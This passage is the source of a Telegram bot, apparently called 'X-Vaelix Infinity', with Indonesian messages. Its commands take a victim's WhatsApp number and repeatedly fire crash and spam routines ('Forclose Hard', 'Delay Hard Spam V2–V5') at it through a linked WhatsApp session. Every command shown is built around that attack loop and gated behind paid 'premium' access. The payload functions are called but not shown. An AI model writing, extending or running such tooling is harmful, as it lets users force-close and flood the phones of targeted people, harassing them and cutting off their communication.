          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/forcloz (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/forcloz"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forcloz sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /forcloz`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Hard
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 20; i++) {
      await RanModzzForclose(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Hard
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/fconemsg (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/fconemsg"] === true) {
    return bot.sendMessage(chatId, "❌ Command /fconemsg sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /fconemsg`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose One Msg
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await RanModzzFC(sock,target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose One Msg
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xkill (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xkill"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xkill sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xkill`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5; i++) {
      await CrashOverlow(target, sock);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xynerx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xynerx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xynerx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xynerx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V3
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 2; i++) {
      await CrashOverlow(target, sock);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V3
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/zypherx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/zypherx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /zypherx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /zypherx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V4
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 3; i++) {
      await CrashOverlow(target, sock);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V4
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xivorx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xivorx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xivorx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xivorx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V5
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 3; i++) {
      await CrashOverlow(target, sock);
      await sleep(3000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V5
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xoya (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
